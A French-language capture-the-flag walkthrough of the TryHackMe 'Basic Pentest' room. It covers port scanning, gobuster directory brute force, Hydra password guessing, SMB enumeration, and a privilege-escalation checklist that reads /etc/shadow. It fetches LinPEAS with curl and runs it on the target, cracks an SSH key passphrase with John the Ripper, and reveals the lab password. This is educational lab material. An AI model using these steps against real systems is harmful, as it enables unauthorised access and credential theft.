# 001_Basic Pentest

![thm_basic](https://user-images.githubusercontent.com/121682396/210281353-01175c2b-73df-4caf-b127-7b0b0324e93e.png)




## Avant tout j'ouvre mon outil de prise de note qui est OBSIDIAN 

(mais vous pouvez choisir n'importe lequel ...)

![image](https://user-images.githubusercontent.com/121682396/210310690-e0541109-4ccc-4295-9234-ec2a9a3c8efd.png)


## Ensuite, je commence par un ping de l'IP cible pour m'assurer que la connexion est fonctionnelle entre les 2 appareils.

![image](https://user-images.githubusercontent.com/121682396/211572382-81561ab8-f6c8-4b4b-a102-0a19b4c32840.png)


## Pour √©viter de taper l'adresse ip √† chaque fois, j'entre l'ip avec un nom que je lui donne dans le fichier hosts qui se trouve dans /etc/ pour que les prochaines fois, j'ai juste √† taper basic au lieu de l'ip

![image](https://user-images.githubusercontent.com/121682396/211572910-4fa18045-4dac-44c9-92cf-7590756b8a85.png)



## Ici pour r√©cup√©rer les services/ports, j'utilise l'outil NMAP

![image](https://user-images.githubusercontent.com/121682396/211573139-eb8d4329-a168-402f-9861-99d5a9f5dfe1.png)


## Pour ouvrir firefox √† partir du terminal je tape la commande suivante 

![image](https://user-images.githubusercontent.com/121682396/211573430-67ff1dd0-1e45-4d89-86e7-a1bfea37b58c.png)


## Pour trouver le r√©pertoire cach√© sur le serveur WEB j'utilise l'outil GOBUSTER qui va bruteforcer l'url afin de trouver des r√©pertoires cach√©s

![image](https://user-images.githubusercontent.com/121682396/211574113-a82c5392-d6cf-4adb-b869-d07eef7af19b.png)


-     dir = indique les r√©pertoires

-     w = chemin de la wordlist

-     u = pour l'url

-     2>/dev/null = pour jeter les erreurs afin de ne pas encombrer le terminal


## Force bruter pour trouver le nom de l'utilisateur et le mot de passe

Pour cela, j'ai utilis√© l'outil HYDRA qui  permet de bruteforcer pour trouver des identifiants (user/pwd)

![image](https://user-images.githubusercontent.com/121682396/211574915-dc5c8bbf-bec3-4ee4-ac97-4c0a430d8ed0.png)

-     L = Login

-     P = Password</b>

-     f = Server adresse  (petit rappel, basic = 10.10.100.222)</b>

-     http-get = HTTP request type</b>


## Trouver le nom du user et mot de passe sur le service SMB (samba) 

Pour l'utilisateur, j'utilise le service <b>ENUM4LINUX</b> (pour √©num√©rer les partages sur un r√©seau ) et pour le mot de passe HYDRA comme l'√©tape pr√©cedente


![image](https://user-images.githubusercontent.com/121682396/211575374-386dcb4d-071d-4f87-bd81-53ac81f9f314.png)

![image](https://user-images.githubusercontent.com/121682396/211575662-49506465-58ca-41cd-ab6f-ac14ca1e1819.png)



## Trouver un moyen de devenir ROOT sur la machine.

Pour cette phase, je commence toujours √† effectuer des recherches manuellement avant de lancer un outil comme <b>Linpeas</b> par exemple

<b>CheckList recherche manuel :</b>
-     sudo -l  (Quel fichier est ex√©cutable en tant que ROOT)
-     cat /etc/passwd  (Affiche les utilisateurs avec passwords)
-     cat /etc/shadow  (Affiche les passwords chiffr√©s des utilisateurs)
-     cat ls -lR /etc/cron  (Visualiser les scripts qui s'ex√©cute r√©guli√®rement)
-     find / user root -perm -u=s 2>/dev/null  (Recherche les programmes qui ont les droits ROOT lors de l'ex√©cution )
-     cat .viminfo  (Affiche l'historique des commandes)

Si on a rien de concluant apr√®s ces recherches, j'installe l'outil <b>LINPEAS</b> pour ne pas perdre trop de temps.

<b>Linpeas</b> est un script qui recherche les chemins possibles pour √©lever les privil√®ges de fa√ßon automatis√©.

- On t√©l√©charge (en local) Linpeas en ligne de commande : 
  
        ‚ñ∂Ô∏è curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh

- On transf√®re le fichier sur la machine cible : 

        ‚ñ∂Ô∏è scp /path/linpeas.sh jan@ip:/dev/shm
     -        scp = outil pour copier de mani√®re chiffr√© des fichiers entre 2 postes
     -        /dev/shm = est l'impl√©mentation d'un syst√®me de fichier temporaire
- On donne les droits d'ex√©cution avec :

        ‚ñ∂Ô∏è chmod +x /linpeas_linux_amd64
- On lance linpeas avec :
        ‚ñ∂Ô∏è ./linpeas.sh
 

![image](https://user-images.githubusercontent.com/121682396/211412407-0a78cf23-d46b-4542-a5ca-908666f6e124.png)

‚≠ê Ici on r√©cup√®re la <b>cl√© priv√©e</b> de l'user <b>kay</b>, mais si on regarde attentivement en haut de la cl√©, nous pouvons voir un indice important
  
  qui indique que la cl√© est <b>"ENCRYPTED" .</b>
  
  Dans ce cas-la nous allons <b>d√©crypter</b> la cl√© via un autre outil qui se nomme <b>John The Ripper</b>
  
  <b>Processus pour John The Ripper</b>
  
  -     Cr√©er un fichier avec la cl√© priv√©e (kay_id_rsa)
  -     Lancer Ssh2John qui est un outil permettant de transformer une cl√© RSA dans un format utilisable par John The Ripper 
  
    Cette comande va cr√©er un nouveau fichier de sortie contenant le nouveau format exploitable
  
  
        ‚ñ∂Ô∏è  /opt/john/ssh2john.py kay_id_rsa > id_rsa.kay
  - Maintenant nous allons √©x√©cuter John The Ripper sur notre fichier
  
        ‚ñ∂Ô∏è /opt/john/john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.kay
        
  ![image](https://user-images.githubusercontent.com/121682396/211422830-9dd551c2-a694-4050-89b4-2db760d54bf2.png)


Mot de passe d√©crypt√©  üèÜ <b>beeswax</b> üèÜ

<b>Nous avons la cl√© priv√©e de l'utilisateur kay ainsi que la passphrase r√©cup√®r√© via john2ripper<b/>
  
  Connexion en ssh avec ces informations :
  
      ‚ñ∂Ô∏è  ssh -i id_rsa kay@ip
  
          - id_rsa = Le fichier contenant la cl√© priv√©e
          - kay = Utilisateur

  
  ![image](https://user-images.githubusercontent.com/121682396/211571287-3693aa1b-3f95-4319-bf28-b726eb3ac6f7.png)

  
Voici le fichier contenant notre üè≥Ô∏è pour cl√¥turer le CTF
  
  ![image](https://user-images.githubusercontent.com/121682396/211571702-fc84de38-7b52-42d8-9e0a-ceb819351f06.png)
